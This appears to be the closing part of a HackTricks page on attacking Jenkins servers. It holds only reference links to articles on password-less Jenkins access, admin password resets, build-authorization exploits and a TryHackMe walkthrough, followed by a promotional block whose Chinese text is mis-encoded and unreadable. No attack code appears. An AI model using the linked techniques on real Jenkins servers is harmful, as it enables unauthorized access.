* [https://www.pentestgeek.com/penetration-testing/hacking-jenkins-servers-with-no-password](https://www.pentestgeek.com/penetration-testing/hacking-jenkins-servers-with-no-password)
* [https://www.lazysystemadmin.com/2018/12/quick-howto-reset-jenkins-admin-password.html](https://www.lazysystemadmin.com/2018/12/quick-howto-reset-jenkins-admin-password.html)
* [https://medium.com/cider-sec/exploiting-jenkins-build-authorization-22bf72926072](https://medium.com/cider-sec/exploiting-jenkins-build-authorization-22bf72926072)
* [https://medium.com/@Proclus/tryhackme-internal-walk-through-90ec901926d3](https://medium.com/@Proclus/tryhackme-internal-walk-through-90ec901926d3)

{% hint style="success" %}
å­¦ä¹ ä¸å®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">[**HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">\
å­¦ä¹ ä¸å®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)**<img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨** æˆ‘ä»¬çš„ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ä»“åº“æäº¤ PR æ¥åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}
